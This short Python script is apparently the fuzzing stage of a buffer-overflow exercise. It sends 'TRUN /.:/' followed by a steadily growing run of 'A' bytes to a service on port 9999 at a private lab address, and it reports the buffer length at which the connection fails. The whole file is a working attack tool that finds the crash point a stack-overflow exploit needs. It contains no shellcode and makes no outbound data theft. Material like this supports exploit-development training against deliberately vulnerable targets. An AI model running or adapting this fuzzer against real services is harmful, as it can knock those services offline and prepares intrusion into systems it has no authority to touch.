#!/bin/python3

import os
import sys
import time
import socket
import termcolor
import threading

rhost = "192.168.37.137";
rport = 9999;

def color(string, color):
    return termcolor.colored(string, color);

def bufferFormat(buffer, rate=100):
    return f"{buffer}{'A' * rate}";

def main():
    print(f"{color('[*]', 'green')} Starting...\n");

    buffer = bufferFormat("TRUN /.:/");

    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
            s.settimeout(3);

            s.connect((rhost, rport));

            server_check = s.recv(64);

            print(f"{color('[*]', 'red')} Sending {len(buffer) - 9}");
            s.send(buffer.encode());

            if(len(buffer) >= 1900):
                buffer = bufferFormat(buffer, 1);
            else:
                buffer = bufferFormat(buffer);

            s.close();
            time.sleep(1);

        except:
            print(f"\n{color('[*]', 'yellow')} Connection closed at {len(buffer) - 9}");
            sys.exit();


main();